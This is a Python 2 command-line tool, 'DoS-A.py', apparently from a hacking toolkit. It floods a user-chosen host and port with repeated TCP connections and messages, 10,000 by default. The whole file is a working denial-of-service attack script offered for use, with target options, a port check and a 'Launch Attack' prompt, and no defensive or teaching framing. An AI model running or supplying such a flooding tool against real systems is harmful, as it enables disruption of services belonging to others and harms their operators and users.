#!/usr/bin/python2
###############################
import sys, optparse, platform
sys.path.append('./lib/')
import tools_core
import socket
##############################
opsys = platform.system()
usage_utama = "[?] Use 'DoS-A.py --help' to show Help Contents"
##############################
def main():
	############################
	dos_port = 80
	dos_msg = "Hey...I Love You"
	dos_times = 10000
	###########################
	tools_core.clearscreen(opsys)
	tools_core.judul()
	try:
		if sys.argv[1] == "-h" or "--help":
			print "[X] Ex: DoS-A.py -u www.target.com --times 1000"
			print "        DoS-A.py -u www.target.com -p 80 -t 1000"
			print ""
	except IndexError:
		None
	parser = optparse.OptionParser()
	parser.add_option("-u",dest="TARGET",help="Specify URL or Domain or IP Address to Attack")
	parser.add_option("--url",dest="TARGET",help="Specify URL or Domain or IP Address to Attack")
	parser.add_option("-p",dest="PORT",help="Specify Port to Attack (Default is 80)")
	parser.add_option("--port",dest="PORT",help="Specify Port to Attack (Default is 80)")
	parser.add_option("-t",dest="COUNT",help="How many Request to Send (Default is 10000)")
	parser.add_option("--times",dest="COUNT",help="How many Request to Send (Default is 10000)")
	parser.add_option("-m",dest="MESSAGES",help="Messages to Send with Request Packets [OPTIONAL]")
	parser.add_option("--messages",dest="MESSAGES",help="Messages to Send with Request Packets [OPTIONAL]")
	(options,args) = parser.parse_args()
	if (options.TARGET == None) or (options.TARGET == "") or (bool(options.TARGET) == False):
		print usage_utama
		exit()
	if (bool(options.TARGET) == True):
		dos_target = str(options.TARGET)
	if (bool(options.PORT) == True):
		dos_port = int(options.PORT)
	if (bool(options.COUNT) == True):
		dos_times = int(options.COUNT)
	if (bool(options.MESSAGES) == True):
		dos_msg = str(options.MESSAGES)
	### ATTACKING ###
	print "[#]==============={ TARGET INFORMATION }===============[#]"
	print " [>] TARGET           : %s" % dos_target
	print " [>] PORT             : %s" % dos_port
	print " [>] TOTAL REQUEST    : %s" % dos_times
	print " [>] MESSAGES TO SEND : %s" % dos_msg
	print "[#]==============={ END OF INFORMATION }===============[#]"
	print ""
	print "[*] Getting IP Address..."
	try:
		dos_ip = socket.gethostbyname(dos_target)
		print "[+] IP Address : %s" % dos_ip
	except:
		print tools_core.err_cantcon
		exit()
	print ""
	print "[*] Checking if Port {} is Open...".format(dos_port)
	tes_core = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	tes_core.settimeout(1)
	tes_hasil = tes_core.connect_ex((dos_ip,dos_port))
	if tes_hasil == 0:
		print "[+] Port {} is Open".format(dos_port)
	else:
		print tools_core.err_cantconp
		exit()
	print ""
	confirm = raw_input("[CONFIRMATION]==={Press [ENTER] to Launch Attack}=> ")
	print "[*] Launching Attack..."
	print "[i] Press 'CTRL+C' to Stop Attack..."
	print ""
	for i in range(1,(dos_times + 1)):
		try:
			ngehe = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			ngehe.connect((dos_ip,dos_port))
			ngehe.send(dos_msg)
			ngehe.sendto(dos_msg,(dos_ip,dos_port))
			ngehe.send(dos_msg)
			print "[+] {0} Request has been sended to {1}".format(i,dos_ip)
		except KeyboardInterrupt:
			print ""
			print "[!] Attack Canceled !!!"
			tools_core.keluar()
		except:
			exit()
	print ""
	print "[+] Job Complete...{} Request Successfuly sended to Target !".format(dos_times)
	tools_core.keluar()

if __name__ == '__main__':
	main()